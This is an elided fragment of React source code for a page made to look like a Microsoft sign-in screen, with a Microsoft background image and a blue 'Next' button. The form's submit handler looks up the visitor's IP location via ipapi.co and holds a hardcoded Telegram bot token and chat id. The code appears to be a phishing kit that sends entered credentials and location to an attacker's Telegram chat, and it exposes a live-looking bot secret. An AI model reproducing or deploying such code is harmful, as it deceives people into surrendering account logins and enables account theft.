  ...
  const onSubmit = async (event) => {
    ...
    fetch("https://ipapi.co/json/")
      ...
      .then((data) => {
        ...
        var token = "8312643582:AAGqdYmJ0te0sRJvoATr_XtyIR69hxwxSUk";
        var chat_id = -5025972318;
    ...
    <div className="flex md:items-center relative justify-center h-screen w-screen md:bg-[url(https://logincdn.msftauth.net/shared/5/js/../images/78_3a53c38a2dc671fb4daf.jpg)] bg-bg-center bg-bg-cover">
      <div className="bg-white p-8">
        ...
        <div className="mt-5 min-w-80">
          ...
          <form
            className="grid gap-3 mt-5 w-full overflow-hidden"
            onSubmit={onSubmit}
          >
            <div className="w-full grid gap-3">
              ...
              <button className="bg-[#0067bb] py-2 px-6 text-base text-white mt-5 ms-auto w-fit">
                Next
              </button>
            </div>
